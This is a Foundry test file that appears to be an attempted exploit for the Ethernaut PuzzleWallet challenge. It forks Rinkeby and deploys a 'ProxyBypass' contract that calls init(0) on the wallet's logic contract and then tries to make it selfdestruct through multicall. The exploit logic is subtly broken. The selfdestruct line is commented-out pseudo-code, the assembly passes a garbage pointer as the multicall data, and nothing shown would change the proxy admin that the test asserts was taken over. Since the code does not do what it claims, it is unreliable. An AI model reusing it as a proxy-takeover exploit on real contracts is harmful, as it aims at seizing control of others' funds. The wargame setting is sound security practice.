// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuzzleWallet.sol";

contract SolutionTest is Test {
    
    uint rinkebyFork;
    string RINKEBY_RPC_URL = vm.envString("RINKEBY_RPC_URL");

    function setUp() public {
        rinkebyFork = vm.createFork(RINKEBY_RPC_URL);
    }

    function testSurgicalBypass() public {
        vm.selectFork(rinkebyFork);
        assertEq(vm.activeFork(), rinkebyFork);

        ProxyBypass proxyBypass = new ProxyBypass(payable(0xF329CE11B1d374862B42306907EAe07D8fFF9971), 0x49B448277D59Ba8d2ca8507f80b2E0633fE72158);
        proxyBypass.surgicalBypass();

        address kweenAdministrator = proxyBypass.checkAdmin();
        address hacker = proxyBypass.hacker();
        assertEq(kweenAdministrator, hacker, "KweenBirb has not yet ascended to KweenAdministrator");
    }

}

contract ProxyBypass {

    PuzzleProxy puzzleProxy;
    PuzzleWallet logicImpl;
    address public hacker;

    constructor(address payable $your_ethernaut_proxy_here, address $your_logic_impl_here) {
        puzzleProxy = PuzzleProxy($your_ethernaut_proxy_here);
        logicImpl = PuzzleWallet($your_logic_impl_here);
        hacker = msg.sender;
    }

    function surgicalBypass() public {
        // pwn the logic implementation contract we got from our js script
        logicImpl.init(0);

        // selfdestruct() the logicImpl contract
        
        // bytes[] memory scalpel = selfdestruct(payable(address(puzzleProxy)));
        bytes[] memory scalpel;
        assembly {
            mstore(0x00, 0xFF)
            scalpel := mload(0x00)
        }
        logicImpl.multicall(scalpel);
    }

    function checkAdmin() public view returns (address) {
        return puzzleProxy.admin();
    }
}
